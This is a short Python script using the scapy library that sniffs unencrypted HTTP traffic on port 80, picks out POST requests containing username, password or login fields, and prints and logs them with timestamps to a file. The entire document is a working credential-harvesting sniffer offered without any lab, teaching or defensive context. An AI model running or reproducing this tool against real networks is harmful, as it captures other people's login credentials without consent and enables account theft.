from scapy.all import sniff, TCP, Raw
from datetime import datetime

#this script filters HTTP POST requests and logs any credentials found
#it saves the logs in a file named logs.txt

LOG_FILE = "logs.txt"

def process_packet(packet):
    if packet.haslayer(Raw) and packet.haslayer(TCP):
        try:
            payload = packet[Raw].load.decode(errors="ignore")
            if "POST" in payload and ("username" in payload or "password" in payload or "login" in payload):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"\n[{timestamp}]\n{payload}\n" 
                print(entry)
                with open(LOG_FILE, "a", encoding="utf-8") as log:
                    log.write(entry + "\n")
        except Exception as e:
            pass  
def main():
    sniff(filter="tcp port 80", prn=process_packet, store=False)

if __name__ == "__main__":
    main()
